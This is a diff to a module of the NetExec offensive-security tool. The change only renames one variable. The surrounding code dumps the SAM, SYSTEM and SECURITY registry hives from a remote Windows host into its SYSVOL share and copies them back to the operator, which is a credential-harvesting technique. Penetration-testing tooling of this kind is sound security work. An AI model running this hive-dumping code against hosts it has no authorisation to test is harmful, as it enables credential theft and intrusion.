@@ -29,13 +29,13 @@ class NXCModule:
     def on_login(self, context, connection):
         connection.args.share = "SYSVOL"
         # enable remote registry
-        remoteOps = RemoteOperations(connection.conn)
+        remote_ops = RemoteOperations(connection.conn)
         context.log.display("Triggering start through named pipe...")
         self.trigger_winreg(connection.conn, context)
-        remoteOps.connect_winreg()
+        remote_ops.connect_winreg()
 
         try:
-            dce = remoteOps.get_rrp()
+            dce = remote_ops.get_rrp()
             for hive in ["HKLM\\SAM", "HKLM\\SYSTEM", "HKLM\\SECURITY"]:
                 hRootKey, subKey = self._strip_root_key(dce, hive)
                 outputFileName = f"\\\\{connection.host}\\SYSVOL\\{subKey}"
@@ -50,8 +50,8 @@ class NXCModule:
         except (Exception, KeyboardInterrupt) as e:
             context.log.fail(str(e))
         finally:
-            if remoteOps:
-                remoteOps.finish()
+            if remote_ops:
+                remote_ops.finish()
 
         # copy remote file to local
         log_path = os.path.expanduser(f"{NXC_PATH}/logs/{connection.hostname}_{connection.host}_{datetime.datetime.now().strftime('%Y-%m-%d_%H%M%S')}.".replace(":", "-"))
